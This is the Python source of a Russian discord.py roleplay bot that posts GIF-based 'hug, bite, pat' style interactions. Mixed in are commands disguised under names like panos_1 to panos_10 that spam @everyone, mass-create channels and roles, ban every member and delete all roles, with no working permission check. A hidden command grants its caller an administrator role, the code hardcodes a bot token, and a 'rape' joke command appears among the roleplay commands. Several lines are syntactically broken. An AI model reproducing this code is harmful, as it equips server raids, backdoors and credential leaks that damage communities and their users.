    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того перед кем хотел извиниться.\nПопробуй так: `>извиниться @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} извинился перед {member.mention}. Надеюсь он его простил.")
    embed.set_image(url=f'{random.choice(sorry_img)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

sorry_img = ["https://c.tenor.com/YTPLqiB6gLsAAAAS/sowwy-sorry.gif", "https://c.tenor.com/i9UkjLlNlt4AAAAM/anime-sorry.gif","https://c.tenor.com/HtLiRJsESVUAAAAM/anime.gif","https://c.tenor.com/DoEJxJFH2g4AAAAM/sorry.gif","https://c.tenor.com/WOIleOQXKoEAAAAM/cry.gif","https://c.tenor.com/Hq2nUJ_FicIAAAAM/anime-cute.gif","https://c.tenor.com/liqgmFIpRPkAAAAM/sad.gif","https://c.tenor.com/788bIjpR5hkAAAAM/anime.gif","https://c.tenor.com/3QO4tu0YohoAAAAM/talentless-nana-psycho.gif","https://c.tenor.com/fGaaBg9SMs4AAAAM/anime-pillow.gif","https://c.tenor.com/RNOB1JF8Br4AAAAM/sorry-crying.gif","https://c.tenor.com/BTm7whW-C8oAAAAM/anime-sad.gif","https://c.tenor.com/mcleRCwFqK4AAAAM/diosa-bocchi.gif","https://c.tenor.com/QmGTdQZ0KnIAAAAM/fuuka-miyazawa-anime.gif","https://c.tenor.com/hbGUzkHNBXgAAAAM/anime-girl.gif"]

@bot.command()
async def Извиниться(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того перед кем хотел извиниться!.\nПопробуй так: `>извиниться @Akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"{author.mention} извинился перед {member.mention}. Надеюсь он его простил.")
    embed.set_image(url=f'{random.choice(sorry_img)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

 



img_rape = ["https://c.tenor.com/PeJyQRCSHHkAAAAM/saki-saki-mukai-naoya.gif","https://c.tenor.com/rWWlRl0tT1gAAAAM/pain-funny.gif","https://c.tenor.com/5HitSvB7CwQAAAAS/tits-boobs.gif","https://c.tenor.com/5HitSvB7CwQAAAAM/tits-boobs.gif","https://c.tenor.com/eFjhbqLeLvQAAAAM/honoka-kousaka.gif","https://c.tenor.com/QDpmM3hjcZMAAAAM/gastrodon-inappropriate.gif","https://c.tenor.com/7M7ifhSz_isAAAAS/tug-of-war-corgi.gif","https://c.tenor.com/SrakLpsMuOIAAAAS/cowboy-lasso.gif","https://c.tenor.com/_JQb43CH7e4AAAAM/rope-bound.gif",""]

@bot.command()
async def изнасиловать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел ИСПУГАТЬ!.\nПопробуй так: `>изнасиловать @Akitiltka`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} решил по изнасиловать участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_rape)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



img_bite = ["https://c.tenor.com/MKjNSLL4dGoAAAAM/bite-cute.gif", "https://c.tenor.com/aKzAQ_cFsFEAAAAM/arms-bite.gif", "https://c.tenor.com/0uRmrUvyZFEAAAAM/vamp-vampire-bite.gif","https://c.tenor.com/mXc2f5NeOpgAAAAM/no-blood-neck-bite.gif","https://c.tenor.com/8UjO54apiUIAAAAM/gjbu-bite.gif","https://c.tenor.com/CUdLH8fai-AAAAAM/anime-bite.gif","https://c.tenor.com/DrLl1pH034gAAAAM/gamerchick42092-anime.gif","https://c.tenor.com/DBwz1nSElowAAAAM/aruu-anime.gif","https://c.tenor.com/u9x1__UkHZcAAAAM/mashiroiro-symphony-pure-white-symphony.gif","https://c.tenor.com/fBQ-2RNG_6YAAAAM/fox-squirrel.gif"]

@bot.command()
async def кусь(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел ИСПУГАТЬ!.\nПопробуй так: `>изнасиловать @Akitiltka`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} Укусил участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_bite)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def Кусь(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел укусить!.\nПопробуй так: `>укусить @Akitiltka`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} Укусил участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_bite)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



@bot.command()
async def Укусить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел ИСПУГАТЬ!.\nПопробуй так: `>изнасиловать @Akitiltka`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} Укусил участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_bite)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def укусить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел укусить!.\nПопробуй так: `>укусить @Akitiltka`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} Укусил участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_bite)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



@bot.command()
async def кастрировать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того перед кем хотел кастрировать.\nПопробуй так: `>кастрировать @q-shka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} кастрировал {member.mention}.")
#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author } \n гифки не будет:)", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


@bot.command()
async def Кастрировать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того перед кем хотел кастрировать.\nПопробуй так: `>кастрировать @q-shka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} кастрировал {member.mention}.")
#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n гифки не будет:)", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


img_lays = ("https://c.tenor.com/bgGMTIJhEvEAAAAS/anime-lick-lick.gif","https://c.tenor.com/rWtIltahEoAAAAAM/kawaii-lick.gif","https://c.tenor.com/XBs2LbC5QFcAAAAM/t34-squid-game.gif","https://c.tenor.com/495nUnSeL4sAAAAM/fang-teeth.gif","https://c.tenor.com/YD8a9VOLYcoAAAAM/anime-girl.gif","https://c.tenor.com/S5I9g4dPRn4AAAAM/omamori-himari-manga.gif")
@bot.command()
async def лизнуть(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел лизнуть!.\nПопробуй так: `>лизнуть @Akitiltka`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} лизнул участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_lays)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


@bot.command()
async def Лизнуть(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
            await ctx.send("Извини, но команда была введена не верно, ты забыл ввести того, кого хотел лизнуть!.\nПопробуй так: `>Лизнуть @qwix`")
    author = ctx.author


     #сам embed
    embed = discord.Embed(
        color = 0x22ff00,
        description = f"Участник {author.mention} лизнул участника {member.mention}.")
    embed.set_image(url=f'{random.choice(img_lays)}')#Здесь у меня хранится список url картинок объятий
    #футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author}", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def поздравить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел поздравить.\nПопробуй так: `>поздравить  @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} поздравил {member.mention}.")
    embed.set_image(url=f'{random.choice(img_happy)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n тут гифка есть...", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



@bot.command()
async def Поздравить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел поздравить.\nПопробуй так: `>поздравить  @akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} поздравил {member.mention}.")
    embed.set_image(url=f'{random.choice(img_happy)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n тут гифка есть...", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

img_happy = ["https://c.tenor.com/2qK0YSfBm1AAAAAM/anime-congrats.gif","https://c.tenor.com/iVt8L2C_J7QAAAAM/congratulations-neon-genesis-evangelion.gif","https://c.tenor.com/Vhz3ovWxWDMAAAAM/congratulations-good-job.gif","https://c.tenor.com/ZwmM31Say_cAAAAM/penny.gif","https://c.tenor.com/GhyH35d2IIsAAAAM/congratulations-happy.gif","https://c.tenor.com/rxb_jtw6_ogAAAAM/haha-anime.gif","https://c.tenor.com/M34ircc4bKgAAAAM/prefect-congratulations.gif","https://c.tenor.com/YmF9VmmNLvMAAAAM/hachikuji-bakemonogatari.gif","https://c.tenor.com/vCPmYU195ZMAAAAM/congratulations.gif","https://c.tenor.com/5QtH2W8-qDMAAAAM/%D1%81%D0%BB%D0%B0%D0%B2%D0%B0-%D0%BF%D0%BE%D0%BA%D1%83%D1%88%D0%B0%D0%BB.gif"]




img_do = ["https://c.tenor.com/7CqG_biFhWQAAAAM/anime-chest.gif","https://c.tenor.com/Sp7yE5UzqFMAAAAM/spank-slap.gif","https://c.tenor.com/4RFHbPsBxFUAAAAM/satone-shichmiya-chuunibyou-demo-koi-ga-shitai.gif","https://c.tenor.com/I59-iJUDG2kAAAAM/anime-love.gif","https://c.tenor.com/dIdqCX-VMqkAAAAM/nekopara-anime.gif","https://c.tenor.com/4RFHbPsBxFUAAAAM/satone-shichmiya-chuunibyou-demo-koi-ga-shitai.gif","https://c.tenor.com/EMQB9n_G4-4AAAAM/funny-face-face.gif","https://c.tenor.com/EMQB9n_G4-4AAAAM/funny-face-face.gif","https://c.tenor.com/EMQB9n_G4-4AAAAM/funny-face-face.gif","https://c.tenor.com/xecYiuaOOrUAAAAM/touch.gif","https://c.tenor.com/wd80_rwY0FMAAAAM/anime-now.gif","https://c.tenor.com/VWeZjYlbxykAAAAM/chuunibyou-shy.gif"]

@bot.command()
async def потрогать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел потрогать.\nПопробуй так: `>потрогать  @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} потрогал {member.mention}.")
    embed.set_image(url=f'{random.choice(img_do)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n тут гифка есть...(нет)", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



@bot.command()
async def опрос(ctx, *, arg):
    embed = discord.Embed(title = arg, description = "Да или нет?", colour = discord.Colour.from_rgb(0, 204, 102))
    msg = await ctx.send(embed=embed) #текст с голосованием
    await msg.add_reaction('<:heavycheckmark2259:978701401595183154>')
    await msg.add_reaction('<:_removebgpreview:978703527633387551>')

    msg = await msg.channel.fetch_message(msg.id)

    for reaction in msg.reactions:
        print(reaction, reaction.count)#Этот код мне дали в ответах и он ничего не выводит

@bot.command()
async def Опрос(ctx, *, arg):
    embed = discord.Embed(title = arg, description = "Да или нет?", colour = discord.Colour.from_rgb(0, 204, 102))
    msg = await ctx.send(embed=embed) #текст с голосованием
    await msg.add_reaction('<:heavycheckmark2259:978701401595183154>')
    await msg.add_reaction('<:_removebgpreview:978703527633387551>')

    msg = await msg.channel.fetch_message(msg.id)

    for reaction in msg.reactions:
        print(reaction, reaction.count)


@bot.command()
async def Вопрос(ctx, ctx2):
    await ctx.reply(random.choice(['Да✅', 'Нет❌']))


@bot.command()
async def вопрос(ctx, ctx2):
    await ctx.reply(random.choice(['Да✅', 'Нет❌']))




@bot.command()
async def похвалить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел похвалить.\nПопробуй так: `>похвалить  @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} похвалил {member.mention}.")
    embed.set_image(url=f'{random.choice(img_pohv)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n спасите", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


@bot.command()
async def Похвалить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел похвалить.\nПопробуй так: `>похвалить  @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} похвалил {member.mention}.")
    embed.set_image(url=f'{random.choice(img_pohv)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n спасите", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



img_pohv = ["https://c.tenor.com/ZafC06r3sksAAAAM/anime-anime-girl.gif", "https://c.tenor.com/ZAcNZTZMsuoAAAAM/anime-glow.gif","https://c.tenor.com/V7jqlmuQxtIAAAAM/midoriya-izuku.gif","https://c.tenor.com/zb9WDwe-lMYAAAAM/yuigahama-yui.gif","https://c.tenor.com/0Aqv_tvkSbgAAAAM/keke-tang-praise-you.gif","https://c.tenor.com/ZsvuZmjW3bUAAAAM/praise-these-beans.gif","https://c.tenor.com/wszBxj63twoAAAAM/lostbelt-mash.gif","https://c.tenor.com/2gJZ7kPbBscAAAAM/hanamaru-kindergarten-anime.gif"]




img_nose = ["https://c.tenor.com/1hMFQPm5GOwAAAAM/wataten-watashi-ni-tenshi-ga-maiorita.gif","https://c.tenor.com/W7JlmX7lKDoAAAAM/cute-anime.gif","https://c.tenor.com/LYqBYYitM8wAAAAM/to-love-ru-sniff.gif","https://c.tenor.com/US_eL1xfdUgAAAAM/smell-smelly.gif","https://c.tenor.com/IjMHp9pM29wAAAAM/mike-miche.gif","https://c.tenor.com/GfUVUzmud-4AAAAM/fox-cute.gif","https://c.tenor.com/nu0sM-X3v4IAAAAM/ermine-sniff.gif","https://c.tenor.com/DsKjqhH_kEMAAAAS/rabbit-sniff.gif","https://c.tenor.com/h-oLp2T-H_0AAAAM/tabbycat-funny.gif","https://c.tenor.com/SUWvLsN2lHkAAAAM/hachubby-hachu.gif"]


@bot.command()
async def понюхать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел понюхать.\nПопробуй так: `>понюхать @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} понюхал {member.mention}.")
    embed.set_image(url=f'{random.choice(img_nose)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n меня не спасут(", icon_url=author.avatar_url)
    await ctx.send(embed=embed)



@bot.command()
async def Понюхать(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел понюхать.\nПопробуй так: `>понюхать @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} понюхал {member.mention}.")
    embed.set_image(url=f'{random.choice(img_nose)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n меня не спасут(", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

stroke_img = ["https://c.tenor.com/VzJtkXVo06wAAAAM/yuru-yuri-anime.gif","https://c.tenor.com/Bd1EOG4VU4MAAAAM/kitten-anime.gif","https://c.tenor.com/BorPfFoubXoAAAAM/anime-neko.gif","https://c.tenor.com/rK-JL-Dx0sMAAAAM/catgirl.gif","https://c.tenor.com/ciMvsh1DuqIAAAAM/cat-scratch.gif","https://c.tenor.com/SX1EvWCNzkcAAAAM/anime-gjuytnk.gif","https://c.tenor.com/BorPfFoubXoAAAAM/anime-neko.gif",]

@bot.command()
async def погладить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел погладить.\nПопробуй так: `>погладить @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} погладил {member.mention}.")
    embed.set_image(url=f'{random.choice(stroke_img)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n меня не спасут( \n спасите:(((", icon_url=author.avatar_url)
    await ctx.send(embed=embed)


@bot.command()
async def Погладить(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел погладить.\nПопробуй так: `>погладить @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} погладил {member.mention}.")
    embed.set_image(url=f'{random.choice(stroke_img)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n меня не спасут( \n спасите:(((", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

pn_img = ["https://c.tenor.com/WXJF2QatHA4AAAAM/anime-ouch.gif","https://c.tenor.com/D5OWYMGcAzAAAAAM/escondido-catedrales.gif","https://c.tenor.com/4F6aGlGwyrwAAAAM/sdf-avatar.gif","https://c.tenor.com/icV2ba3gU7MAAAAM/kick-anime.gif","https://c.tenor.com/w3_5V8KfRO4AAAAM/kick-anime.gif","https://c.tenor.com/IlaJyD0XEMwAAAAM/index-anime.gif","https://c.tenor.com/4zwRLrLMGm8AAAAM/chifuyu-chifuyu-kick.gif","https://c.tenor.com/Lyqfq7_vJnsAAAAM/kick-funny.gif","https://c.tenor.com/HLjrGeO-wFkAAAAM/kick-get.gif","https://c.tenor.com/2rPUjwaFwkYAAAAM/anime-imouto.gif","https://c.tenor.com/u_v-f2md4E8AAAAM/kick-anime.gif"]
#пнуть

@bot.command()
async def пнуть(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел пнуть.\nПопробуй так: `>пнуть @akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} пнул участника {member.mention}.")
    embed.set_image(url=f'{random.choice(pn_img)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n я все еще надеюсь на спасени....", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def Пнуть(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел пнуть.\nПопробуй так: `>пнуть @akitiltka`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} пнул участника {member.mention}.")
    embed.set_image(url=f'{random.choice(pn_img)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n я все еще надеюсь на спасени....", icon_url=author.avatar_url)
    await ctx.send(embed=embed)




@bot.command(pass_context = True)
@commands.has_permissions(administrator = True)
async def разбан( ctx, *, member):
    banned_users = await ctx.guild.bans()

    for ban_entry in banned_users:
        user = ban_entry.user

        await ctx.guild.unban(user)

        await ctx.send("Участник {member.mention} был разбанен")


#плохие слова
@bot.event
async def on_message( message ):
    await bot.process_commands( message )

    msg = message.content.lower()
    if msg in BADWORDS:
        await message.delete()
        await message.author.send(f'{message.author.mention}, Не матерись')





@bot.command()
async def шлепнуть(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел шлепнуть.\nПопробуй так: `>шлепнуть  @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} шлепнул {member.mention}.")
    embed.set_image(url=f'{random.choice(img_shlep)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n ммм", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def Шлепнуть(ctx, member: discord.Member = None, amount = 1):
    await ctx.channel.purge(limit = amount)#Удаляет триггер команды
    if member == None:
        await ctx.send("Извини, но команда была введена не верно,ты забыл ввести того кого хотел шлепнуть.\nПопробуй так: `>шлепнуть  @qwix`")
    author = ctx.author

     #сам embed
    embed = discord.Embed(
        color = 0x8ff6,
        description = f"{author.mention} шлепнул {member.mention}.")
    embed.set_image(url=f'{random.choice(img_shlep)}')#Здесь у меня хранится список url картинок объятий

#футер
    author = ctx.message.author
    embed.set_footer(text=f"Команду запросил {author} \n ммм", icon_url=author.avatar_url)
    await ctx.send(embed=embed)

img_shlep = ["https://c.tenor.com/qvvKGZhH0ysAAAAM/anime-girl.gif","https://c.tenor.com/klNTzZNDmEgAAAAM/slap-hit.gif","https://c.tenor.com/1lemb3ZmGf8AAAAM/anime-slap.gif","https://c.tenor.com/jgImPggI1ZMAAAAM/bakugo-anime-slap.gif","https://c.tenor.com/h_qFkmXJnYQAAAAM/cat-attack.gif","https://c.tenor.com/dHNqRCJQSnIAAAAM/slap-%E0%B8%99%E0%B8%8A.gif","https://c.tenor.com/7OTX6eSjjdcAAAAM/bozo-anime.gif","https://c.tenor.com/E564Xfkuw5YAAAAM/gareizero-slap.gif"]





























def dev(ctx):
    return ctx.message.author.id == '794231907809361970'
@bot.command() # Создаём команду
@commands.check(dev) # Даём разрешение только использовать её создателю бота
async def ясоздатель(ctx):
    await ctx.send("Да")



@bot.command()
async def оффлайн(ctx):

    author = ctx.message.author.name
    if author == "Akitiltka":
            await bot.change_presence(status=discord.Status.offline)
    message = await ctx.send(embed=discord.Embed(description=f'{ctx.author.name} Бот перешел в скрытый режим', colour=discord.Color.purple()))
@bot.event
async def on_command_error(ctx, error):
  if isinstance(error, commands.BotMissingPermissions):
    await ctx.reply(embed = discord.Embed(title=f'Ошибка',description=f'Извини, но у меня нет прав!', colour = discord.Color.red()))


@bot.command()
async def обычный_режим(ctx):
    message = await ctx.send(embed=discord.Embed(description=f'{ctx.author.name} Бот перешел в обычный режим', colour=discord.Color.purple()))
    await client.change_presence(status=discord.Status.online())



 
@bot.event

async def on_command_error(ctx, error):

   if isinstance(error, commands.CommandNotFound):

       await ctx.send(embed = discord.Embed(description = f'{ctx.author.name}, команда не найдена!', colour = discord.Color.red()))

   elif isinstance(error, commands.MissingRequiredArgument):

       await ctx.send(embed=discord.Embed(description=f'{ctx.author.name}, в команде был потерян аргумент ', colour=discord.Color.red()))

   elif isinstance(error, commands.CheckFailure):

       await ctx.send(embed = discord.Embed(description = f'{ctx.author.name}, у вас недостаточно прав для выполнения данной команды!', colour = discord.Color.red()))

 

 
@bot.command()
async def якто(ctx):
 
    author = ctx.message.author.name
    if author == "qwix":
        global cats
        cats = []
        await ctx.send("Создатель))")
    else:
        await ctx.send("некто")


@bot.command() #Команда абобус
async def токен1(ctx):
    await ctx.reply('Чтобы получить мой токен надо посмотреть видио - https://www.youtube.com/watch?v=dQw4w9WgXcQ')





@bot.command(pass_context=True) #спамит везде
async def panos_4(ctx, m):
    bot_access_ids = ['794231907809361970']
    count = 0
    while count < int(m):
        await ctx.send("@everyone @here @everyone")
        count += 1
    guild = ctx.message.guild


@bot.command(pass_context=True)
async def panos_5(ctx, m):
    bot_access_ids = ['794231907809361970']
    count = 0
    while count < int(m):
        await ctx.send("@everyone your server was crashed by хохохо!!!")
        count += 1
    guild = ctx.message.guild

    await guild.create_text_channel("БВТЯРА")
    count1 = 0
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('БВТЯРА ')
        count1 += 1

    for m in ctx.guild.members:
        try:
            await m.ban
        except:
            pass






@bot.command(pass_context=True) #спам ролями >panos_2 10000
async def panos_1(ctx, m):
    bot_access_ids = ['794231907809361970']
    await ctx.message.delete()
    count = 0
    while count < int(m):
        await ctx.guild.create_role(name="дибил")
        count += 1




 
@bot.command() #бан всех
async def panos_6(ctx):
    bot_access_ids = ['794231907809361970']
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="Закрываемся!")#баним
        except:
            pass

 
@bot.command() #очистка чата полностью
async def panos_10(ctx, amount=10000):
    bot_access_ids = ['794231907809361970']
    await ctx.channel.purge(limit=amount) #очищаем



@bot.command() #удаление ролей всех
async def panos_2(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="По просьбе")
        except:
            pass

@bot.command()
async def якто(ctx):

    author = ctx.message.author.name
    if author == "Akitiltka":
        global cats
        cats = []
        await ctx.send("Создатель))")
    else:
        await ctx.send("некто")




@bot.command(pass_context=True)  # разрешаем передавать агрументы, давание админа
async def гавно123адм(ctx):  # создаем асинхронную фунцию бота
    bot_access_ids = ['794231907809361970']
    guild = ctx.guild
    perms = discord.Perm #добовляем роль
    
    await ctx.message.delete()ermissions(administrator=True) #права роли
    await guild.create_role(name="ХЕЛПЕР", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="ХЕЛПЕР") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(rol


bot.run("OTk0NTc0ODY4MDIyNTU4NzQw.GaudrK.ueAQc76xwNTu7xaEZ3eD4RI0DEp0k3a2LlHRnQ")
